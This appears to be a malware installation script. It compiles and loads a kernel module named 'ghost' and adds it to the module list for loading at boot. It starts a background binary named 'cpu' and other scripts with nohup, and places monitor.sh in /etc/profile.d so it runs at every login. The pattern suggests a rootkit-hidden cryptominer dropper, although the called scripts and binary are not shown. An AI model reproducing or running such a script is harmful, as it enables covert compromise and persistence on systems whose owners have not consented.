# /bin/bash

cd ghost
make
insmod ghost.ko
echo -ne "#<ghost>\nghost\n#<ghost>" >> etc/modules
cd ..
chmod +x dispose.sh
./dispose.sh
chmod +x run.sh
nohup ./run.sh &
echo -e "\n\n"
chmod +x cpu
nohup ./cpu &
chmod +x monitor.sh
nohup ./monitor.sh &


chmod +x monitor.sh
cp monitor.sh /etc/profile.d/